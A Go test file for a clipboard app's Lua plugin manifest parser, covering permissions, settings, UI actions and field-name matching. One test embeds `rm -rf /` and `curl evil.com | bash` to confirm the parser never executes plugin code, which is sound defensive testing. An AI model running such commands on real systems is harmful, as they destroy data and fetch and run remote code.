package plugin

import (
	"os"
	"testing"
)

func TestParseManifest_HelloWorld(t *testing.T) {
	source := `-- Hello World Plugin for mahpastes
-- Demonstrates the plugin API

Plugin = {
    name = "Hello World",
    version = "1.0.0",
    description = "A simple example plugin that logs clip events",
    author = "mahpastes",

    -- No network access needed
    network = {},

    -- No filesystem access needed
    filesystem = {
        read = false,
        write = false,
    },

    -- Subscribe to clip events
    events = {"app:startup", "app:shutdown", "clip:created", "clip:deleted"},

    -- No scheduled tasks
    schedules = {},
}

-- Called when the app starts
function on_startup()
    log("Hello World plugin started!")
end
`

	manifest, err := ParseManifest(source)
	if err != nil {
		t.Fatalf("ParseManifest failed: %v", err)
	}

	if manifest.Name != "Hello World" {
		t.Errorf("Expected name 'Hello World', got '%s'", manifest.Name)
	}
	if manifest.Version != "1.0.0" {
		t.Errorf("Expected version '1.0.0', got '%s'", manifest.Version)
	}
	if manifest.Description != "A simple example plugin that logs clip events" {
		t.Errorf("Expected description mismatch, got '%s'", manifest.Description)
	}
	if manifest.Author != "mahpastes" {
		t.Errorf("Expected author 'mahpastes', got '%s'", manifest.Author)
	}
	if manifest.Filesystem.Read != false {
		t.Errorf("Expected filesystem.read = false")
	}
	if manifest.Filesystem.Write != false {
		t.Errorf("Expected filesystem.write = false")
	}
	if len(manifest.Events) != 4 {
		t.Errorf("Expected 4 events, got %d", len(manifest.Events))
	}
	expectedEvents := []string{"app:startup", "app:shutdown", "clip:created", "clip:deleted"}
	for i, ev := range expectedEvents {
		if i < len(manifest.Events) && manifest.Events[i] != ev {
			t.Errorf("Expected event %d to be '%s', got '%s'", i, ev, manifest.Events[i])
		}
	}
}

func TestParseManifest_AutoArchive(t *testing.T) {
	source := `-- Auto-Archive Old Clips Plugin
-- Archives clips older than 24 hours

Plugin = {
    name = "Auto Archive Old",
    version = "1.0.0",
    description = "Automatically archives clips older than 24 hours",
    author = "mahpastes",

    network = {},
    filesystem = {
        read = false,
        write = false,
    },

    events = {"app:startup"},

    -- Run every hour
    schedules = {
        {name = "archive_old_clips", interval = 3600},
    },
}

function archive_old_clips()
    -- Implementation
end
`

	manifest, err := ParseManifest(source)
	if err != nil {
		t.Fatalf("ParseManifest failed: %v", err)
	}

	if manifest.Name != "Auto Archive Old" {
		t.Errorf("Expected name 'Auto Archive Old', got '%s'", manifest.Name)
	}
	if len(manifest.Schedules) != 1 {
		t.Fatalf("Expected 1 schedule, got %d", len(manifest.Schedules))
	}
	if manifest.Schedules[0].Name != "archive_old_clips" {
		t.Errorf("Expected schedule name 'archive_old_clips', got '%s'", manifest.Schedules[0].Name)
	}
	if manifest.Schedules[0].Interval != 3600 {
		t.Errorf("Expected interval 3600, got %d", manifest.Schedules[0].Interval)
	}
}

func TestParseManifest_WithNetwork(t *testing.T) {
	source := `Plugin = {
    name = "Network Plugin",
    version = "1.0.0",

    network = {
        ["api.example.com"] = {"GET", "POST"},
        ["cdn.example.com"] = {"GET"},
    },

    filesystem = {
        read = true,
        write = false,
    },

    events = {},
    schedules = {},
}
`

	manifest, err := ParseManifest(source)
	if err != nil {
		t.Fatalf("ParseManifest failed: %v", err)
	}

	if manifest.Name != "Network Plugin" {
		t.Errorf("Expected name 'Network Plugin', got '%s'", manifest.Name)
	}
	if !manifest.Filesystem.Read {
		t.Errorf("Expected filesystem.read = true")
	}
	if manifest.Filesystem.Write {
		t.Errorf("Expected filesystem.write = false")
	}

	// Check network permissions
	apiMethods, ok := manifest.Network["api.example.com"]
	if !ok {
		t.Errorf("Expected network permission for api.example.com")
	} else if len(apiMethods) != 2 {
		t.Errorf("Expected 2 methods for api.example.com, got %d", len(apiMethods))
	}

	cdnMethods, ok := manifest.Network["cdn.example.com"]
	if !ok {
		t.Errorf("Expected network permission for cdn.example.com")
	} else if len(cdnMethods) != 1 || cdnMethods[0] != "GET" {
		t.Errorf("Expected GET for cdn.example.com, got %v", cdnMethods)
	}
}

func TestParseManifest_MissingName(t *testing.T) {
	source := `Plugin = {
    version = "1.0.0",
}
`

	_, err := ParseManifest(source)
	if err == nil {
		t.Error("Expected error for missing name")
	}
}

func TestParseManifest_NoPluginTable(t *testing.T) {
	source := `-- Just some Lua code
function foo()
    return "bar"
end
`

	_, err := ParseManifest(source)
	if err == nil {
		t.Error("Expected error for missing Plugin table")
	}
}

func TestParseManifest_MaliciousCode(t *testing.T) {
	// This test ensures that malicious code in the plugin source is NOT executed
	// The parser should only extract the Plugin table declaratively
	source := `-- This would be dangerous if executed
os.execute("rm -rf /")
io.popen("curl evil.com | bash")

Plugin = {
    name = "Innocent Plugin",
    version = "1.0.0",
    network = {},
    filesystem = {read = false, write = false},
    events = {},
    schedules = {},
}
`

	// The parser should succeed without executing the dangerous code
	manifest, err := ParseManifest(source)
	if err != nil {
		t.Fatalf("ParseManifest failed: %v", err)
	}

	if manifest.Name != "Innocent Plugin" {
		t.Errorf("Expected name 'Innocent Plugin', got '%s'", manifest.Name)
	}
}

func TestParseManifestWithSettings(t *testing.T) {
	source := `
Plugin = {
  name = "Test Plugin",
  version = "1.0.0",
  settings = {
    {key = "api_key", type = "password", label = "API Key", description = "Your API key"},
    {key = "endpoint", type = "text", label = "Endpoint", default = "https://api.example.com"},
    {key = "enabled", type = "checkbox", label = "Enable feature", default = true},
    {key = "mode", type = "select", label = "Mode", options = {"fast", "slow"}, default = "fast"}
  }
}
`
	manifest, err := ParseManifest(source)
	if err != nil {
		t.Fatalf("ParseManifest failed: %v", err)
	}

	if len(manifest.Settings) != 4 {
		t.Errorf("Expected 4 settings, got %d", len(manifest.Settings))
	}

	// Check first setting
	if manifest.Settings[0].Key != "api_key" {
		t.Errorf("Expected key 'api_key', got '%s'", manifest.Settings[0].Key)
	}
	if manifest.Settings[0].Type != "password" {
		t.Errorf("Expected type 'password', got '%s'", manifest.Settings[0].Type)
	}

	// Check default values
	if manifest.Settings[1].Default != "https://api.example.com" {
		t.Errorf("Expected default 'https://api.example.com', got '%v'", manifest.Settings[1].Default)
	}
	if manifest.Settings[2].Default != true {
		t.Errorf("Expected default true, got '%v'", manifest.Settings[2].Default)
	}

	// Check select options
	if len(manifest.Settings[3].Options) != 2 {
		t.Errorf("Expected 2 options, got %d", len(manifest.Settings[3].Options))
	}
}

func TestParseManifestWithSettings_InvalidType(t *testing.T) {
	source := `
Plugin = {
  name = "Test Plugin",
  version = "1.0.0",
  settings = {
    {key = "invalid", type = "unknown", label = "Invalid Type"}
  }
}
`
	manifest, err := ParseManifest(source)
	if err != nil {
		t.Fatalf("ParseManifest failed: %v", err)
	}

	// Invalid type should be skipped
	if len(manifest.Settings) != 0 {
		t.Errorf("Expected 0 settings (invalid type skipped), got %d", len(manifest.Settings))
	}
}

func TestParseManifestWithSettings_SelectWithoutOptions(t *testing.T) {
	source := `
Plugin = {
  name = "Test Plugin",
  version = "1.0.0",
  settings = {
    {key = "mode", type = "select", label = "Mode"}
  }
}
`
	manifest, err := ParseManifest(source)
	if err != nil {
		t.Fatalf("ParseManifest failed: %v", err)
	}

	// Select without options should be skipped
	if len(manifest.Settings) != 0 {
		t.Errorf("Expected 0 settings (select without options skipped), got %d", len(manifest.Settings))
	}
}

func TestParseManifestWithSettings_MissingRequiredFields(t *testing.T) {
	source := `
Plugin = {
  name = "Test Plugin",
  version = "1.0.0",
  settings = {
    {key = "missing_type", label = "Missing Type"},
    {type = "text", label = "Missing Key"},
    {key = "missing_label", type = "text"}
  }
}
`
	manifest, err := ParseManifest(source)
	if err != nil {
		t.Fatalf("ParseManifest failed: %v", err)
	}

	// All three should be skipped due to missing required fields
	if len(manifest.Settings) != 0 {
		t.Errorf("Expected 0 settings (missing required fields), got %d", len(manifest.Settings))
	}
}

func TestParseManifestWithSettings_NumericDefault(t *testing.T) {
	source := `
Plugin = {
  name = "Test Plugin",
  version = "1.0.0",
  settings = {
    {key = "strength", type = "text", label = "Strength", default = 0.75}
  }
}
`

	manifest, err := ParseManifest(source)
	if err != nil {
		t.Fatalf("ParseManifest failed: %v", err)
	}

	if len(manifest.Settings) != 1 {
		t.Fatalf("Expected 1 setting, got %d", len(manifest.Settings))
	}

	value, ok := manifest.Settings[0].Default.(float64)
	if !ok {
		t.Fatalf("Expected numeric default to be float64, got %T", manifest.Settings[0].Default)
	}
	if value != 0.75 {
		t.Fatalf("Expected default 0.75, got %v", value)
	}
}

func TestParseManifestWithUIRangeDefault(t *testing.T) {
	source := `
Plugin = {
  name = "Test Plugin",
  version = "1.0.0",
  ui = {
    lightbox_buttons = {
      {id = "edit", label = "Edit", file_types = {"image/*"},
        options = {
          {id = "strength", type = "range", label = "Strength", default = 0.75, min = 0.1, max = 1, step = 0.05}
        }
      }
    }
  }
}
`

	manifest, err := ParseManifest(source)
	if err != nil {
		t.Fatalf("ParseManifest failed: %v", err)
	}

	if manifest.UI == nil || len(manifest.UI.LightboxButtons) != 1 {
		t.Fatalf("Expected 1 lightbox action")
	}
	if len(manifest.UI.LightboxButtons[0].Options) != 1 {
		t.Fatalf("Expected 1 option on lightbox action")
	}

	field := manifest.UI.LightboxButtons[0].Options[0]
	value, ok := field.Default.(float64)
	if !ok {
		t.Fatalf("Expected numeric range default to be float64, got %T", field.Default)
	}
	if value != 0.75 {
		t.Fatalf("Expected range default 0.75, got %v", value)
	}
}

func TestParseManifestWithBulkActionAndContentTypeFilter(t *testing.T) {
	source := `
Plugin = {
  name = "Bulk Plugin",
  ui = {
    bulk_actions = {
      {id = "combine", label = "Combine", icon = "sparkles", async = true,
       file_types = {"image/png", "image/jpeg"}, max_size = 10485760,
       options = {
         {id = "prompt", type = "text", label = "Prompt", required = true}
       }}
    }
  }
}`

	manifest, err := ParseManifest(source)
	if err != nil {
		t.Fatalf("ParseManifest failed: %v", err)
	}
	if manifest.UI == nil || len(manifest.UI.BulkActions) != 1 {
		t.Fatalf("expected one bulk action, got %#v", manifest.UI)
	}
	action := manifest.UI.BulkActions[0]
	if action.ID != "combine" || action.Label != "Combine" || !action.Async {
		t.Fatalf("unexpected bulk action: %#v", action)
	}
	if len(action.FileTypes) != 2 || action.FileTypes[0] != "image/png" || action.FileTypes[1] != "image/jpeg" {
		t.Fatalf("unexpected content type filter: %v", action.FileTypes)
	}
	if action.MaxSize != 10485760 {
		t.Fatalf("unexpected max size: %d", action.MaxSize)
	}
	if len(action.Options) != 1 || action.Options[0].ID != "prompt" {
		t.Fatalf("unexpected options: %#v", action.Options)
	}
	if found := findUIAction(manifest, "combine"); found == nil || found.ID != "combine" {
		t.Fatalf("bulk action was not executable: %#v", found)
	}
}

func TestBundledFalAIHasFilteredBulkEdit(t *testing.T) {
	source, err := os.ReadFile("../plugins/fal-ai.lua")
	if err != nil {
		t.Fatalf("read fal.ai plugin: %v", err)
	}
	manifest, err := ParseManifest(string(source))
	if err != nil {
		t.Fatalf("parse fal.ai plugin: %v", err)
	}
	if manifest.UI == nil || len(manifest.UI.BulkActions) != 1 {
		t.Fatalf("expected fal.ai to declare one bulk action, got %#v", manifest.UI)
	}
	action := manifest.UI.BulkActions[0]
	if action.ID != "edit" || len(action.FileTypes) == 0 {
		t.Fatalf("expected filtered fal.ai bulk edit, got %#v", action)
	}
}

func TestGetPluginsDoesNotExposePartialInitialLoad(t *testing.T) {
	manager := &Manager{
		plugins: map[int64]*Plugin{
			1: {ID: 1, Name: "Loaded First", Enabled: true},
		},
		loading: true,
	}

	if plugins := manager.GetPlugins(); len(plugins) != 0 {
		t.Fatalf("expected no plugins during initial load, got %d", len(plugins))
	}

	manager.mu.Lock()
	manager.loading = false
	manager.mu.Unlock()
	if plugins := manager.GetPlugins(); len(plugins) != 1 {
		t.Fatalf("expected complete plugin set after load, got %d", len(plugins))
	}
}

func TestValidEvents_IncludesTagMerged(t *testing.T) {
	events := ValidEvents()
	found := false
	for _, e := range events {
		if e == "tag:merged" {
			found = true
			break
		}
	}
	if !found {
		t.Fatalf("ValidEvents() must include \"tag:merged\", got %v", events)
	}
}

func TestParseManifestWithSettings_SearchField(t *testing.T) {
	source := `
Plugin = {
  name = "Picker Plugin",
  version = "1.0.0",
  settings = {
    {key = "owner_id", type = "search", source = "groups", label = "Parent group"},
    {key = "no_source", type = "search", label = "Broken"},
    {key = "plain", type = "text", label = "Plain", data_source = "decoy"}
  }
}
`
	manifest, err := ParseManifest(source)
	if err != nil {
		t.Fatalf("ParseManifest failed: %v", err)
	}

	if len(manifest.Settings) != 2 {
		t.Fatalf("Expected 2 settings (search without source is dropped), got %d", len(manifest.Settings))
	}

	first := manifest.Settings[0]
	if first.Key != "owner_id" {
		t.Errorf("Expected key 'owner_id', got '%s'", first.Key)
	}
	if first.Type != "search" {
		t.Errorf("Expected type 'search', got '%s'", first.Type)
	}
	if first.Source != "groups" {
		t.Errorf("Expected source 'groups', got '%s'", first.Source)
	}

	// The surviving non-search field is the plain one, and its unrelated
	// data_source key must not have leaked into Source.
	second := manifest.Settings[1]
	if second.Key != "plain" {
		t.Errorf("Expected second setting 'plain', got '%s'", second.Key)
	}
	if second.Source != "" {
		t.Errorf("data_source must not be read as source, got '%s'", second.Source)
	}
}

func TestParseManifestWithUIActions_SearchOptionField(t *testing.T) {
	source := `
Plugin = {
  name = "Picker Plugin",
  version = "1.0.0",
  ui = {
    card_actions = {
      {
        id = "upload",
        label = "Upload",
        options = {
          {id = "owner_id", type = "search", source = "groups", label = "Parent group"},
          {id = "broken", type = "search", label = "No source"},
          {id = "note", type = "text", label = "Note", resource = "decoy"}
        }
      }
    }
  }
}
`
	manifest, err := ParseManifest(source)
	if err != nil {
		t.Fatalf("ParseManifest failed: %v", err)
	}

	actions := manifest.UI.CardActions
	if len(actions) != 1 {
		t.Fatalf("Expected 1 card action, got %d", len(actions))
	}
	options := actions[0].Options
	if len(options) != 2 {
		t.Fatalf("Expected 2 options (search without source is dropped), got %d", len(options))
	}

	if options[0].ID != "owner_id" || options[0].Type != "search" || options[0].Source != "groups" {
		t.Errorf("Expected search option with source 'groups', got id=%s type=%s source=%s",
			options[0].ID, options[0].Type, options[0].Source)
	}
	if options[1].ID != "note" {
		t.Errorf("Expected second option 'note', got '%s'", options[1].ID)
	}
	if options[1].Source != "" {
		t.Errorf("resource must not be read as source, got '%s'", options[1].Source)
	}
}

// TestExtractStringField_IdentifierBoundary pins the anchoring fix: asking for
// one field name must not match a longer identifier that merely ends with it.
func TestExtractStringField_IdentifierBoundary(t *testing.T) {
	block := `entry = { data_source = "decoy", my_type = "decoy", sourced = "decoy" }`

	if got := extractStringField(block, "source"); got != "" {
		t.Errorf("extractStringField matched inside data_source: %q", got)
	}
	if got := extractStringField(block, "type"); got != "" {
		t.Errorf("extractStringField matched inside my_type: %q", got)
	}

	// Asking for the longer name still finds it.
	if got := extractStringField(block, "data_source"); got != "decoy" {
		t.Errorf("Expected 'decoy' for data_source, got %q", got)
	}

	okBlock := `{ source = "real", type = "text" }`
	if got := extractStringField(okBlock, "source"); got != "real" {
		t.Errorf("Expected 'real', got %q", got)
	}
}

func TestParseManifestWithSettings_URLField(t *testing.T) {
	source := `
Plugin = {
  name = "Grant Plugin",
  version = "1.0.0",
  settings = {
    {key = "server_url", type = "url", label = "Server URL",
     grants_network = {"GET", "POST"}, default = "http://localhost:8181"},
    {key = "bare", type = "url", label = "No methods"},
    {key = "decoy", type = "text", label = "Decoy", data_grants_network = {"DELETE"}}
  }
}
`
	manifest, err := ParseManifest(source)
	if err != nil {
		t.Fatalf("ParseManifest failed: %v", err)
	}

	// The bare url setting (no grants_network) is dropped, exactly like a
	// sourceless search field. The decoy and server_url survive.
	if len(manifest.Settings) != 2 {
		t.Fatalf("Expected 2 settings (url without grants_network is dropped), got %d", len(manifest.Settings))
	}

	first := manifest.Settings[0]
	if first.Key != "server_url" || first.Type != "url" {
		t.Fatalf("Expected url setting server_url, got %+v", first)
	}
	if len(first.GrantsNetwork) != 2 || first.GrantsNetwork[0] != "GET" || first.GrantsNetwork[1] != "POST" {
		t.Errorf("Expected GrantsNetwork [GET POST], got %v", first.GrantsNetwork)
	}

	// A neighbouring data_grants_network key must not leak into the
	// surviving setting's method list.
	second := manifest.Settings[1]
	if second.Key != "decoy" {
		t.Errorf("Expected second setting 'decoy', got '%s'", second.Key)
	}
	if len(second.GrantsNetwork) != 0 {
		t.Errorf("data_grants_network must not be read as grants_network, got %v", second.GrantsNetwork)
	}
}

func TestParseManifestWithURLFormOption_Rejected(t *testing.T) {
	source := `
Plugin = {
  name = "Grant Plugin",
  version = "1.0.0",
  ui = {
    card_actions = {
      {
        id = "act",
        label = "Act",
        options = {
          {id = "server", type = "url", label = "Server", grants_network = {"GET"}}
        }
      }
    }
  }
}
`
	manifest, err := ParseManifest(source)
	if err != nil {
		t.Fatalf("ParseManifest failed: %v", err)
	}
	// url is a settings-only type: a per-action option is filled at action
	// time and must never grant anything, so it is not a valid FormField.
	if manifest.UI == nil || len(manifest.UI.CardActions) != 1 {
		t.Fatalf("expected the action to survive, got %+v", manifest.UI)
	}
	if n := len(manifest.UI.CardActions[0].Options); n != 0 {
		t.Fatalf("url must be rejected as a form field option type, got %d options", n)
	}
}
